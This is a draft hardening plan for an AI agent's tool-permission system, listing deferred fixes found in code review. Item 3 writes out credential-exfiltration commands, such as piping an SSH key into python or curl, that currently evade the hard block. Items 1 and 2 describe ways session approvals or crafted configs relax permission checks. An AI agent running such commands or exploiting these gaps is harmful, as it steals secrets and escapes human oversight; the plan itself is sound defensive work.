---
status: draft
priority: P2
owner: relixiaobo
created: 2026-05-30
updated: 2026-05-30
---

# Agent Tool Permissions — Hardening Follow-ups

Follow-up work after the agent-tool-permissions implementation landed in
[#60](https://github.com/relixiaobo/lin-outliner/pull/60). The core policy
(`docs/plans/archive/agent-tool-permissions.md`, now `done`) shipped with its
critical/high bash-classifier and rule-validator fail-opens fixed pre-merge.
This plan tracks the **non-blocking** medium/low items surfaced by the deep
review that were deliberately deferred out of the fix commit. None is a live
fail-open today; each is correctness-of-contract, defense-in-depth, or
observability.

The contract from `agent-tool-permissions.md` still governs. Where this plan
and that plan disagree, the parent plan wins. Every change must preserve the
existing precedence (`platform hard block > configured deny > configured ask >
configured allow > descriptor default > classifier`) and must never widen
access. Keep `bun run typecheck` green and add a test for each item.

All line numbers are against `main` at the time of writing (post-#60,
`633d502`); re-confirm with a quick grep before editing, since the file moves.

## Items

### 1. `sessionApproved` short-circuits to allow before configured-ask (MEDIUM)

`src/main/agentPermissions.ts:311` — after `configured_deny` (good) and the
restricted-mode check, but **before** configured-ask / global-allow / global-ask
resolution, a session-scoped approval returns `allow` for every action kind
except `shell.sandbox_override` / `shell.background_process`:

```ts
if (sessionApproved && !descriptors.some((d) =>
    d.actionKind === 'shell.sandbox_override' || d.actionKind === 'shell.background_process')) {
  return allow(access, preapproved, sessionApproved, 'Allowed by a session permission rule.', ...);
}
```

This silently relaxes a configured `ask` rule and skips the ask
resolver/classifier. The path is reachable: `resolveApproval` pushes
`suggestedSessionRule` into `permissionSessionAllowRules` for `scope==='session'`,
and `main.ts` forwards `scope: 'session'` from IPC. The parent plan removes
session grants as a permission concept (Decision #3; "current session-scoped
approval runtime support must be removed, hidden, or migrated") and requires
that a configured `ask` is never silently relaxed by `allow` (precedence). Not a
deny/hard-block bypass (those precede it), hence medium.

**Fix:** evaluate configured `deny` AND configured `ask` before honoring
`sessionApproved` — i.e. move the session short-circuit below global resolution,
or remove it and keep session infra only as a non-permission compatibility layer
per the migration notes. **Test:** a configured `ask(Action(...))` plus a
matching session allow rule must still resolve to `ask`/`needs_user`, not
`allow`.

### 2. `parseGlobalToolPermissionSettings` pre-shaped early-return (MEDIUM, latent)

`src/main/agentToolPermissionRules.ts:257` —

```ts
export function parseGlobalToolPermissionSettings(input: unknown): GlobalToolPermissionConfig {
  if (isGlobalToolPermissionConfig(input)) return input;   // <-- returns verbatim, no re-validation
  ...
}
```

`isGlobalToolPermissionConfig` returns true for any record with `rules` and
`diagnostics` arrays, so a pre-shaped object is returned verbatim, skipping
`parseGlobalToolPermissionRule` (ALLOW_FORBIDDEN_ACTIONS, arbitrary-code list,
agent-spawn ban, capability deny-only). A crafted
`{rules:[{ruleValue:'Action(agent.permission.modify)',decision:'allow',...}],diagnostics:[]}`
would be honored, relaxing a hard block. Not reachable in the current call graph
(the production loader passes the grouped `{permissions:{allow,ask,deny}}` string
form, which IS validated), but it is a fragile trust boundary on an exported
`unknown`-typed function.

**Fix:** remove the fast-path, or re-run every `rule.ruleValue` through
`parseGlobalToolPermissionRule` even when a pre-parsed config is supplied. Treat
the grouped string form as the only authoritative input. **Test:** a pre-shaped
config carrying an `allow` for a forbidden action is stripped to the built-in
default, never honored.

### 3. Exfil redline misses interpreter / ssh sinks and bare SSH-key variants (MEDIUM)

`src/main/agentPermissions.ts` (`looksLikeNetworkWrite` + the sensitive-read +
network-write gate). The hard block fires only when the sink is recognized:
curl/wget-with-data, scp/sftp/rsync/rclone, `aws s3 cp`, `gsutil cp`,
nc/netcat. It MISSES:

- interpreter sinks: `python3 -c '...urlopen...'`, `node -e 'fetch(...)'`,
  `perl` LWP, `ruby` Net::HTTP;
- `ssh host 'cat >> loot'`, ftp/telnet, `wget --post-file`;
- bare-relative SSH key variants `id_ecdsa` / `id_dsa` (present in
  `SENSITIVE_PATH_PATTERNS` but not in `SENSITIVE_COMMAND_PATTERNS`, and gated by
  `looksLikePath` for bare tokens).

So `cat ~/.ssh/id_rsa | python3 -c '...'` and `cat id_ecdsa | curl -d @- url`
(from the project dir) downgrade from `platform_hard_block` to `ask`. Not a
silent-allow today (network_write / local_code_execution are not
auto-allow-eligible), but exploitable unattended once a user sets an allow rule
for `shell.local_code_execution`. The parent plan (#6/#18) requires
piped/encoded/obfuscated sensitive-read + network-write to be hard-blocked.

**Fix (prefer the structural one):** at the descriptor-aggregation layer, promote
**sensitive-read + ANY external/network segment in the same compound command** to
`platform_hard_block`, rather than enumerating sinks. If enumerating, add
interpreter heads (`python`/`python3`/`node`/`deno`/`ruby`/`perl`/`php`) and
`ssh`/`ftp`/`telnet`/`wget --post-file`, and add `id_dsa`/`id_ecdsa`/`id_*` to
`SENSITIVE_COMMAND_PATTERNS`. **Tests:** fixtures for python/node/ssh sinks and a
bare `id_ecdsa` read-to-network all → `platform_hard_block`.

### 4. Dual event vocabulary left live (MEDIUM, observability)

`src/core/agentEventLog.ts` + emit sites in `src/main/agentRuntime.ts`. The PR
added `tool.permission.checked` / `tool.permission.resolved` but still actively
emits `approval.requested` / `approval.resolved` for the SAME decision, under a
different requestId space (`approval` uses bare `randomUUID()`; permission uses
`` `permission-${randomUUID()}` ``), so the two records of one decision cannot be
joined. Parent plan checklist #16 explicitly asked NOT to leave two parallel
vocabularies.

**Fix:** pick one. Either make `tool.permission.*` the sole persisted permission
record and demote `approval.*` to transient renderer IPC only, OR share one
`requestId` across both and document `approval.*` = UI-surface vs
`tool.permission.*` = policy-decision. **Test:** one resolved approval produces a
single joinable permission record (assert the requestId correlation).

### 5. Denied-reason literals diverge from the plan contract (LOW)

`src/main/agentPermissionAskResolver.ts` (reason union) and
`src/main/agentPermissionEvents.ts`. The PR uses `'hard_block'` (plan:
`'platform_hard_block'`), `'user'` (plan: `'user_denied'`), and adds a non-spec
`'runtime'` bucket; `agentPermissionEvents.ts` `recoverable: reason !==
'hard_block'` marks a durable `configured_deny` as recoverable. All six
conceptual reasons are produced and distinguishable, so this is a wire-format /
label mismatch, not fail-open — but it will bite any consumer coded against the
plan's literal strings.

**Fix:** rename to match the plan (`platform_hard_block`, `user_denied`) or
ratify the implemented names in `agent-tool-permissions.md`; keep one canonical
reason enum shared by resolver, event log, and the tool-result message. Drive
`recoverable` off an explicit set: `configured_deny` and any
`platformHardBlock`/redline → `recoverable: false`; only
`classifier_blocked`/`classifier_unavailable`/`user`/`run_aborted` → `true`.
**Test:** assert the structured `permission_denied` shape uses the canonical
reason strings and `recoverable` flags `configured_deny` false.

## Out of scope

- The skill-shell second permission path (`agentSkillShell.ts`) — currently dead
  scaffolding (un-instantiated `agentRuntime.ts`, no assigned
  `skillShellApprovalHandler`); wire it through the shared resolver only when that
  scaffolding is activated.
- `Capability(external_messaging)` / `Capability(payments)` enforcement — these
  capabilities are now narrowed out of `SUPPORTED_AGENT_TOOL_CAPABILITIES` (no
  longer falsely advertised); emit `descriptor.capabilities` when the
  corresponding tool surface actually lands.
- Symlink-following on workspace write paths (lexical-only `resolvePermissionPath`)
  — pre-existing on `main`, not introduced by #60; handle with the broader
  realpath hardening if/when it is scoped.

## Acceptance

- `bun run typecheck` clean.
- Each item above lands with the named test(s).
- No regression in the existing permission test matrix
  (`tests/core/agentPermissions.test.ts`,
  `tests/core/agentPermissionAskResolver.test.ts`) — 30/0 today.
- The precedence and redline invariants from `agent-tool-permissions.md` still
  hold; no change widens access.
